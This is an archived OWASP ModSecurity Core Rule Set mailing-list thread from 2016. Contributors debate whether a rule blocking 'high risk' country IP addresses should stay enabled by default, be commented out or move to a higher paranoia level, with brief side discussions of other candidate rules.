Subject:  Re: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten controversial candidate 900050 / 910100 (Client IP is from a HIGH Risk Country Location)

Chaim,

I see you and Walter agreeing on the idea to keep the rule around
in standard mode. I would probably still comment out the default
country list - but that's a different question.

I've removed the rule from the list of paranoia candidates.

Btw: The country list involves China, but the documentation does not
name China (but all the other countried).

Cheers,

Christian


On Mon, Feb 15, 2016 at 04:19:44AM +0000, Chaim Sanders wrote:
 In general I like to assume that if people are going to get caught by
 something blocking unintentionally it will be a configuration from the
 configuration file, as they are supposed to be reading those :-). I
 honestly haven?t heard many complaints about this feature and as a result
 I?d probably leave it enabled as it as sad as it is, is fairly effective.
 
 On 2/13/16, 12:30 AM,
 "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
 Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
 on behalf of christian.folini at netnea.com> wrote:
 
 >Hi there,
 >
 >It seems I overlooked this candidate, where Franziska said she is unsure
 >whether we should blog certain countries in a default installation or
 >not.
 >
 >The rule does:
 >  SecRule GEO:COUNTRY_CODE "@pm %{tx.high_risk_country_codes}"
 >
 >With tx.high_risk_country_codes being set to
 >"UA ID YU LT EG RO BG TR RU PK MY CN"
 >in modsecurity_crs_10_setup.conf.example.
 >
 >Depending on your location, requests from the given set of
 >countried may be desired and not potential attacks. So I think
 >Franziska has a point.
 >
 >One resolution would be to leave the rule where it is, but comment
 >out the definition of the variable in
 >modsecurity_crs_10_setup.conf.example
 >and provide multiple default variants in the comments.
 >That could also be performed in combination with the move to
 >the paranoia mode.
 >
 >Opinions?
 >
 >Christian
 >
 >
 >--
 >The problem is, if you're not a hacker,
 >you can't tell who the good hackers are.
 >--- Paul Graham
 >_______________________________________________
 >Owasp-modsecurity-core-rule-set mailing list
 >Owasp-modsecurity-core-rule-set at lists.owasp.org
 >http://scanmail.trustwave.com/?c=4062&d=5sS-1i1jGNzLWl4_4Oku6bhM-zSgEVOp-i
 >xlzEmHDg&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
 >asp-modsecurity-core-rule-set
 
 
 ________________________________
 
 This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org
https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set


-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160215/6a61cbc9/attachment.html>

From Manuel.LeosRivas at gemalto.com  Tue Feb 16 08:08:13 2016
From: Manuel.LeosRivas at gemalto.com (Leos Rivas Manuel)
Date: Tue, 16 Feb 2016 08:08:13 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial candidate 900050 / 910100 (Client IP is from a HIGH Risk
 Country Location)
In-Reply-To: <0B291D6A-1901-4A04-A53C-99628DC6267B@owasp.org>
References: <20160213053026.GA9613@elias>
	<D2E6BBB0.1A479%csanders@trustwave.com>
	<20160215201735.GC4580@elias>,
	<0B291D6A-1901-4A04-A53C-99628DC6267B@owasp.org>
Message-ID: <yhnyd9mqtb9s4smj9r8y82a0.1455610086934@email.android.com>

I agree nice to see that many people sharing ; )

On my side I propose to name the mode of operation  'strict' instead of 'paranoid'.

Regards,
Manuel



Envoy? de mon Galaxy S5 4G+ Orange


-------- Original message --------
From: Ryan Barnett <ryan.barnett at owasp.org>
Date: 16/02/2016 00:29 (GMT+01:00)
To: Christian Folini <christian.folini at netnea.com>, Chaim Sanders <CSanders at trustwave.com>
Cc: owasp-modsecurity-core-rule-set at lists.owasp.org
Subject: Re: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten controversial candidate 900050 / 910100 (Client IP is from a HIGH Risk Country Location)

A couple comments -

  1.  I am ecstatic to see all of the community feedback and participation.  This is how I always envisioned it working.  ModSecurity, and the OWASP CRS. Are community projects.  They will live/die by community involvement.
  2.  I regards to these settings ? it is purely semantics but I would recommend s/paranoid/aggressive/g.   The former has a negative connotation to it while the later seems more even handed.   The point is that these rule can provide some level of value however it is at the expense of False Positives.

-Ryan

From: <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org>> on behalf of Christian Folini <christian.folini at netnea.com<mailto:christian.folini at netnea.com>>
Date: Monday, February 15, 2016 at 3:17 PM
To: Chaim Sanders <CSanders at trustwave.com<mailto:CSanders at trustwave.com>>
Cc: "owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>" <owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set at lists.owasp.org>>
Subject: Re: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten controversial candidate 900050 / 910100 (Client IP is from a HIGH Risk Country Location)

Chaim,

I see you and Walter agreeing on the idea to keep the rule around
in standard mode. I would probably still comment out the default
country list - but that's a different question.

I've removed the rule from the list of paranoia candidates.

Btw: The country list involves China, but the documentation does not
name China (but all the other countried).

Cheers,

Christian


On Mon, Feb 15, 2016 at 04:19:44AM +0000, Chaim Sanders wrote:
In general I like to assume that if people are going to get caught by
something blocking unintentionally it will be a configuration from the
configuration file, as they are supposed to be reading those :-). I
honestly haven?t heard many complaints about this feature and as a result
I?d probably leave it enabled as it as sad as it is, is fairly effective.
On 2/13/16, 12:30 AM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on behalf of
Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org>
on behalf of christian.folini at netnea.com<mailto:christian.folini at netnea.com>> wrote:
>Hi there,
>
>It seems I overlooked this candidate, where Franziska said she is unsure
>whether we should blog certain countries in a default installation or
>not.
>
>The rule does:
>  SecRule GEO:COUNTRY_CODE "@pm %{tx.high_risk_country_codes}"
>
>With tx.high_risk_country_codes being set to
>"UA ID YU LT EG RO BG TR RU PK MY CN"
>in modsecurity_crs_10_setup.conf.example.
>
>Depending on your location, requests from the given set of
>countried may be desired and not potential attacks. So I think
>Franziska has a point.
>
>One resolution would be to leave the rule where it is, but comment
>out the definition of the variable in
>modsecurity_crs_10_setup.conf.example
>and provide multiple default variants in the comments.
>That could also be performed in combination with the move to
>the paranoia mode.
>
>Opinions?
>
>Christian
>
>
>--
>The problem is, if you're not a hacker,
>you can't tell who the good hackers are.
>--- Paul Graham
>_______________________________________________
>Owasp-modsecurity-core-rule-set mailing list
>Owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:Owasp-modsecurity-core-rule-set at lists.owasp.org>
>http://scanmail.trustwave.com/?c=4062&d=5sS-1i1jGNzLWl4_4Oku6bhM-zSgEVOp-i
>xlzEmHDg&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
>asp-modsecurity-core-rule-set
________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

--
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:Owasp-modsecurity-core-rule-set at lists.owasp.org>
https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

________________________________
This message and any attachments are intended solely for the addressees and may contain confidential information. Any unauthorized use or disclosure, either whole or partial, is prohibited.
E-mails are susceptible to alteration. Our company shall not be liable for the message if altered, changed or falsified. If you are not the intended recipient of this message, please delete it and notify the sender.
Although all reasonable efforts have been made to keep this transmission free from viruses, the sender will not be liable for damages caused by a transmitted virus.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160216/a0ec654b/attachment-0001.html>

From christian.folini at netnea.com  Wed Feb 17 14:21:13 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Wed, 17 Feb 2016 15:21:13 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950120 / 931130 (Possible RFI)
In-Reply-To: <0FA048DB-EB7A-416D-9964-FDF72DC6AAB7@spam.lifeforms.nl>
References: <20160202080600.GA29931@elias>
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>
	<20160207192339.GB30297@elias>
	<484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>
	<20160210063610.GB8002@elias>
	<107A498C-7347-4C83-A6C1-AFA62DC3BA42@spam.lifeforms.nl>
	<20160214124226.GA8350@elias>
	<0FA048DB-EB7A-416D-9964-FDF72DC6AAB7@spam.lifeforms.nl>
Message-ID: <20160217142113.GA22516@elias>

Walter,

On Sun, Feb 14, 2016 at 05:38:54PM +0100, Walter Hop wrote:
> > If we have most rules at paranoia level 1 and default is
> > paranoia level 1. Should this rule be a 1 with additional
> > whitelisting of FPs, or should we assign it a paranoia
> > level of 2?
> > 
> > I'm OK with both options.
> 
> OK. Still a hard call but if we set default paranoia level at 1 (sounds good to me) I would say this rule should start at a level of 2.

Thank you. I just moved the rule back from "dropped" to "confirmed" in
the wiki. 

I am glad you confirmed the default level setting. My first pull request
is mostly done and I just moved the anomaly score evaluation and
correlation to level 0 while the other rules are running in level 1.
That works nicely.

> I was thinking out loud about the principle of CRSv2 users since they might expect this rule to stay. But we should document clearly somewhere what the benefits and drawbacks of the levels are. (Maybe it?s time to start a CHANGES document in the source tree?)

Absolutely.

You came up with a proposal. It was too narrow for me. My
proposal in the mechanics blogpost was probably to broad.
Right now, the definition of the paranoia stuff in
modsecurity_crs_10_setup.conf.example reads:

...
# The possible paranoia levels are 0,1,2,3 and 4.
#
# FIXME
# Level 0: ...
# Level 1: ...
# Level 2: ...
# Level 3: ...
# Level 4: ...
...

:-)

(btw. here is the git link:
https://github.com/dune73/owasp-modsecurity-crs/tree/paranoia-mode)


Cheers,

Christian


-- 
If liberty means anything at all, it means the right to tell people
what they do not want to hear.
-- George Orwell

From CSanders at trustwave.com  Wed Feb 17 14:21:19 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Wed, 17 Feb 2016 14:21:19 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode:
	Forgotten	controversial candidate 900050 / 910100 (Client IP
	is from a	HIGH Risk Country Location)
Message-ID: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>

So what's the decision here?
Comment it out? Put it in paranoid? Leave only a smaller subset?

On Feb 15, 2016 5:21 PM, Walter Hop <modsec at spam.lifeforms.nl> wrote:
I think the source is an article from 2003, which explains why Yugoslavia is in the list:
http://citeseerx.ist.psu.edu/viewdoc/download;jsessionid=2A684B6B2B6E99D03F578D3296E05483?doi=10.1.1.198.9996&rep=rep1&type=pdf<http://scanmail.trustwave.com/?c=4062&d=9s_C1g9Xm4csjNFXCLkV562M7S5Kl2BVHTbgHImsVQ&s=5&u=http%3a%2f%2fciteseerx%2eist%2epsu%2eedu%2fviewdoc%2fdownload%3bjsessionid%3d2A684B6B2B6E99D03F578D3296E05483%3fdoi%3d10%2e1%2e1%2e198%2e9996%26rep%3drep1%26type%3dpdf>

(Just to correct, I didn?t want to keep the rule enabled by default, but instead I?d rather comment it as an example.)


On 15 Feb 2016, at 21:55, iulian at sphere.ro<mailto:iulian at sphere.ro> wrote:

Dears,

I am just wondering on what basis you are considering these countries to be potentially risky?

Even if those are risky simply putting these on default will be a mistake.
Most people don't read the configuration file or don't fully understand every feature and just stick with the default configuration.

If you want advanced protection then you are forced to make changes or even make your own rules.

Best regards,
Iulian



On February 15, 2016 10:17:35 PM GMT+02:00, Christian Folini <christian.folini at netnea.com<mailto:christian.folini at netnea.com>> wrote:

Chaim,

I see you and Walter agreeing on the idea to keep the rule around
in standard mode. I would probably still comment out the default
country list - but that's a different question.

I've removed the rule from the list of paranoia candidates.

Btw: The country list involves China, but the documentation does not
name China (but all the other countried).

Cheers,

Christian


On Mon, Feb 15, 2016 at 04:19:44AM +0000, Chaim Sanders wrote:

In general I like to assume that if people are going to get caught by
something blocking unintentionally it will be a configuration from the
configuration file, as they are supposed to be reading those :-). I
honestly haven?t heard many complaints about this feature and as a result
I?d probably leave it enabled as it as sad as it is, is fairly effective.

On 2/13/16, 12:30 AM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on behalf of
Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org>
on behalf of christian.folini at netnea.com<mailto:christian.folini at netnea.com>> wrote:

Hi there,

It seems I overlooked this candidate, where Franziska said she is unsure
whether we should blog certain countries in a default installation or
not.

The rule does:
SecRule GEO:COUNTRY_CODE "@pm %{tx.high_risk_country_codes}"

With tx.high_risk_country_codes being set to
"UA ID YU LT EG RO BG TR RU PK MY CN"
in modsecurity_crs_10_setup.conf.example.

Depending on your location, requests from the given set of
countried may be desired and not potential attacks. So I t hink
Franziska has a point.

One resolution would be to leave the rule where it is, but comment
out the definition of the variable in
modsecurity_crs_10_setup.conf.example
and provide multiple default variants in the comments.
That could also be performed in combination with the move to
the paranoia mode.

Opinions?

Christian


--
The problem is, if you're not a hacker,
you can't tell who the good hackers are.
--- Paul Graham
________________________________

Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:Owasp-modsecurity-core-rule-set at lists.owasp.org>
http://scanmail.trustwave.com/?c=4062&d=5sS-1i1jGNzLWl4_4Oku6bhM-zSgEVOp-i
xlzEmHDg&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
asp-modsecurity-core-rule-set


________________________________


This trans mission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

--
Sent from my Android device with K-9 Mail. Please excuse my brevity.
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:Owasp-modsecurity-core-rule-set at lists.owasp.org>
https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set<http://scanmail.trustwave.com/?c=4062&d=9s_C1g9Xm4csjNFXCLkV562M7S5Kl2BVHWflQNr-XA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fowasp-modsecurity-core-rule-set>

--
Walter Hop | PGP key: https://lifeforms.nl/pgp<http://scanmail.trustwave.com/?c=4062&d=9s_C1g9Xm4csjNFXCLkV562M7S5Kl2BVHWXmSdyvUw&s=5&u=https%3a%2f%2flifeforms%2enl%2fpgp>


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160217/003aa690/attachment.html>

From Manuel.LeosRivas at gemalto.com  Wed Feb 17 15:01:30 2016
From: Manuel.LeosRivas at gemalto.com (Leos Rivas Manuel)
Date: Wed, 17 Feb 2016 15:01:30 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia
	Mode:	Forgotten	controversial candidate 900050 / 910100
	(Client IP	is from a	HIGH Risk Country Location)
In-Reply-To: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
References: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
Message-ID: <E2C9913D99137A42A2A9646B1E82B8DB010D44A26F@A1GTOEMBXV001.gto.a3c.atos.net>

Hi all,

I would prefer to have it commented and or in paranoia level >=3

Regards,
Manuel

From: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On Behalf Of Chaim Sanders
Sent: mercredi 17 f?vrier 2016 15:21
To: Walter Hop
Cc: owasp-modsecurity-core-rule-set at lists.owasp.org
Subject: Re: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten controversial candidate 900050 / 910100 (Client IP is from a HIGH Risk Country Location)


So what's the decision here?
Comment it out? Put it in paranoid? Leave only a smaller subset?
On Feb 15, 2016 5:21 PM, Walter Hop <modsec at spam.lifeforms.nl<mailto:modsec at spam.lifeforms.nl>> wrote:
I think the source is an article from 2003, which explains why Yugoslavia is in the list:
http://citeseerx.ist.psu.edu/viewdoc/download;jsessionid=2A684B6B2B6E99D03F578D3296E05483?doi=10.1.1.198.9996&rep=rep1&type=pdf<http://scanmail.trustwave.com/?c=4062&d=9s_C1g9Xm4csjNFXCLkV562M7S5Kl2BVHTbgHImsVQ&s=5&u=http%3a%2f%2fciteseerx%2eist%2epsu%2eedu%2fviewdoc%2fdownload%3bjsessionid%3d2A684B6B2B6E99D03F578D3296E05483%3fdoi%3d10%2e1%2e1%2e198%2e9996%26rep%3drep1%26type%3dpdf>

(Just to correct, I didn?t want to keep the rule enabled by default, but instead I?d rather comment it as an example.)


On 15 Feb 2016, at 21:55, iulian at sphere.ro<mailto:iulian at sphere.ro> wrote:

Dears,

I am just wondering on what basis you are considering these countries to be potentially risky?

Even if those are risky simply putting these on default will be a mistake.
Most people don't read the configuration file or don't fully understand every feature and just stick with the default configuration.

If you want advanced protection then you are forced to make changes or even make your own rules.

Best regards,
Iulian


On February 15, 2016 10:17:35 PM GMT+02:00, Christian Folini <christian.folini at netnea.com<mailto:christian.folini at netnea.com>> wrote:

Chaim,

I see you and Walter agreeing on the idea to keep the rule around
in standard mode. I would probably still comment out the default
country list - but that's a different question.

I've removed the rule from the list of paranoia candidates.

Btw: The country list involves China, but the documentation does not
name China (but all the other countried).

Cheers,

Christian


On Mon, Feb 15, 2016 at 04:19:44AM +0000, Chaim Sanders wrote:
In general I like to assume that if people are going to get caught by
something blocking unintentionally it will be a configuration from the
configuration file, as they are supposed to be reading those :-). I
honestly haven?t heard many complaints about this feature and as a result
I?d probably leave it enabled as it as sad as it is, is fairly effective.

On 2/13/16, 12:30 AM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on behalf of
Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org>
on behalf of christian.folini at netnea.com<mailto:christian.folini at netnea.com>> wrote:
Hi there,

It seems I overlooked this candidate, where Franziska said she is unsure
whether we should blog certain countries in a default installation or
not.

The rule does:
SecRule GEO:COUNTRY_CODE "@pm %{tx.high_risk_country_codes}"

With tx.high_risk_country_codes being set to
"UA ID YU LT EG RO BG TR RU PK MY CN"
in modsecurity_crs_10_setup.conf.example.

Depending on your location, requests from the given set of
countried may be desired and not potential attacks. So I t hink
Franziska has a point.

One resolution would be to leave the rule where it is, but comment
out the definition of the variable in
modsecurity_crs_10_setup.conf.example
and provide multiple default variants in the comments.
That could also be performed in combination with the move to
the paranoia mode.

Opinions?

Christian


--
The problem is, if you're not a hacker,
you can't tell who the good hackers are.
--- Paul Graham
________________________________

Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:Owasp-modsecurity-core-rule-set at lists.owasp.org>
http://scanmail.trustwave.com/?c=4062&d=5sS-1i1jGNzLWl4_4Oku6bhM-zSgEVOp-i
xlzEmHDg&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
asp-modsecurity-core-rule-set

________________________________


This trans mission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

--
Sent from my Android device with K-9 Mail. Please excuse my brevity.
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:Owasp-modsecurity-core-rule-set at lists.owasp.org>
https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set<http://scanmail.trustwave.com/?c=4062&d=9s_C1g9Xm4csjNFXCLkV562M7S5Kl2BVHWflQNr-XA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fowasp-modsecurity-core-rule-set>

--
Walter Hop | PGP key: https://lifeforms.nl/pgp<http://scanmail.trustwave.com/?c=4062&d=9s_C1g9Xm4csjNFXCLkV562M7S5Kl2BVHWXmSdyvUw&s=5&u=https%3a%2f%2flifeforms%2enl%2fpgp>


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
________________________________
This message and any attachments are intended solely for the addressees and may contain confidential information. Any unauthorized use or disclosure, either whole or partial, is prohibited.
E-mails are susceptible to alteration. Our company shall not be liable for the message if altered, changed or falsified. If you are not the intended recipient of this message, please delete it and notify the sender.
Although all reasonable efforts have been made to keep this transmission free from viruses, the sender will not be liable for damages caused by a transmitted virus.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160217/9cc38b5b/attachment-0001.html>

From franziska.buehler.schmocker at gmail.com  Wed Feb 17 19:19:16 2016
From: franziska.buehler.schmocker at gmail.com (Franziska Buehler)
Date: Wed, 17 Feb 2016 20:19:16 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
 controversial candidate 900050 / 910100 (Client IP is from a HIGH Risk
 Country Location)
In-Reply-To: <E2C9913D99137A42A2A9646B1E82B8DB010D44A26F@A1GTOEMBXV001.gto.a3c.atos.net>
References: <DM2PR0701MB129525A09BCCC5A3E22B5554DBAE0@DM2PR0701MB1295.namprd07.prod.outlook.com>
	<E2C9913D99137A42A2A9646B1E82B8DB010D44A26F@A1GTOEMBXV001.gto.a3c.atos.net>
Message-ID: <CALrdzmL-La1psgQiyopbAS9nEPz85Fkiq4rVkc777SGXo4XX-g@mail.gmail.com>

Hi everybody,

I think the rule 910100 should be moved to the paranoia mode and the
list of countries should be revised.
Or the rule stays in normal mode and the list of countries is emtpy.

Regards,
Franziska

2016-02-17 16:01 GMT+01:00 Leos Rivas Manuel <Manuel.LeosRivas at gemalto.com>:
> Hi all,
>
>
>
> I would prefer to have it commented and or in paranoia level >=3
>
>
>
> Regards,
>
> Manuel
>
>
>
> From: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
> [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On Behalf
> Of Chaim Sanders
> Sent: mercredi 17 f?vrier 2016 15:21
> To: Walter Hop
> Cc: owasp-modsecurity-core-rule-set at lists.owasp.org
> Subject: Re: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten
> controversial candidate 900050 / 910100 (Client IP is from a HIGH Risk
> Country Location)
>
>
>
> So what's the decision here?
>
>
> Comment it out? Put it in paranoid? Leave only a smaller subset?
>
> On Feb 15, 2016 5:21 PM, Walter Hop <modsec at spam.lifeforms.nl> wrote:
>
> I think the source is an article from 2003, which explains why Yugoslavia is
> in the list:
>
> http://citeseerx.ist.psu.edu/viewdoc/download;jsessionid=2A684B6B2B6E99D03F578D3296E05483?doi=10.1.1.198.9996&rep=rep1&type=pdf
>
>
>
> (Just to correct, I didn?t want to keep the rule enabled by default, but
> instead I?d rather comment it as an example.)
>
>
>
>
>
> On 15 Feb 2016, at 21:55, iulian at sphere.ro wrote:
>
>
>
> Dears,
>
> I am just wondering on what basis you are considering these countries to be
> potentially risky?
>
> Even if those are risky simply putting these on default will be a mistake.
> Most people don't read the configuration file or don't fully understand
> every feature and just stick with the default configuration.
>
> If you want advanced protection then you are forced to make changes or even
> make your own rules.
>
> Best regards,
> Iulian
>
>
> On February 15, 2016 10:17:35 PM GMT+02:00, Christian Folini
> <christian.folini at netnea.com> wrote:
>
> Chaim,
>
> I see you and Walter agreeing on the idea to keep the rule around
> in standard mode. I would probably still comment out the default
> country list - but that's a different question.
>
> I've removed the rule from the list of paranoia candidates.
>
> Btw: The country list involves China, but the documentation does not
> name China (but all the other countried).
>
> Cheers,
>
> Christian
>
>
> On Mon, Feb 15, 2016 at 04:19:44AM +0000, Chaim Sanders wrote:
>
> In general I like to assume that if people are going to get caught by
> something blocking unintentionally it will be a configuration from the
> configuration file, as they are supposed to be reading those :-). I
> honestly haven?t heard many complaints about this feature and as a result
> I?d probably leave it enabled as it as sad as it is, is fairly effective.
>
> On 2/13/16, 12:30 AM,
> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
> Christian Folini" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org
> on behalf of christian.folini at netnea.com> wrote:
>
> Hi there,
>
> It seems I overlooked this candidate, where Franziska said she is unsure
> whether we should blog certain countries in a default installation or
> not.
>
> The rule does:
> SecRule GEO:COUNTRY_CODE "@pm %{tx.high_risk_country_codes}"
>
> With tx.high_risk_country_codes being set to
> "UA ID YU LT EG RO BG TR RU PK MY CN"
> in modsecurity_crs_10_setup.conf.example.
>
> Depending on your location, requests from the given set of
> countried may be desired and not potential attacks. So I t hink
> Franziska has a point.
>
> One resolution would be to leave the rule where it is, but comment
> out the definition of the variable in
> modsecurity_crs_10_setup.conf.example
> and provide multiple default variants in the comments.
> That could also be performed in combination with the move to
> the paranoia mode.
>
> Opinions?
>
> Christian
>
>
> --
> The problem is, if you're not a hacker,
> you can't tell who the good hackers are.
> --- Paul Graham
>
> ________________________________
>
>
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> http://scanmail.trustwave.com/?c=4062&d=5sS-1i1jGNzLWl4_4Oku6bhM-zSgEVOp-i
> xlzEmHDg&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
> asp-modsecurity-core-rule-set
>
>
>
> ________________________________
>
>
>
> This trans mission may contain information that is privileged, confidential,
> and/or exempt from disclosure under applicable law. If you are not the
> intended recipient, you are hereby notified that any disclosure, copying,
> distribution, or use of the information contained herein (including any
> reliance thereon) is strictly prohibited. If you received this transmission
> in error, please immediately contact the sender and destroy the material in
> its entirety, whether in electronic or hard copy format.
>
>
> --
> Sent from my Android device with K-9 Mail. Please excuse my brevity.
>
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
>
>
>
> --
> Walter Hop | PGP key: https://lifeforms.nl/pgp
>
>
>
>
>
> ________________________________
>
>
> This transmission may contain information that is privileged, confidential,
> and/or exempt from disclosure under applicable law. If you are not the
> intended recipient, you are hereby notified that any disclosure, copying,
> distribution, or use of the information contained herein (including any
> reliance thereon) is strictly prohibited. If you received this transmission
> in error, please immediately contact the sender and destroy the material in
> its entirety, whether in electronic or hard copy format.
>
> ________________________________
> This message and any attachments are intended solely for the addressees and
> may contain confidential information. Any unauthorized use or disclosure,
> either whole or partial, is prohibited.
> E-mails are susceptible to alteration. Our company shall not be liable for
> the message if altered, changed or falsified. If you are not the intended
> recipient of this message, please delete it and notify the sender.
> Although all reasonable efforts have been made to keep this transmission
> free from viruses, the sender will not be liable for damages caused by a
> transmitted virus.
>
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
>

From franziska.buehler.schmocker at gmail.com  Wed Feb 17 20:05:52 2016
From: franziska.buehler.schmocker at gmail.com (Franziska Buehler)
Date: Wed, 17 Feb 2016 21:05:52 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950907 / 932100 (System command injection)
In-Reply-To: <D2E6B8F1.1A467%csanders@trustwave.com>
References: <20160202081718.GB29931@elias>
	<69CE0D94-2054-443C-8336-033DCCB33934@spam.lifeforms.nl>
	<20160207195530.GC30297@elias> <20160212211715.GB32631@elias>
	<D2E6B8F1.1A467%csanders@trustwave.com>
Message-ID: <CALrdzmKmL8Wa-PdnvdHP_oTE0xUmGPyf4Rxufi4yTa=sn6MMuQ@mail.gmail.com>

Hi,

I also like the idea of splitting the file. Perhaps we even need multiple files.
Walter has a lot of good thougts!
This task doesn't seem to be very easy and some testing will be necessary.
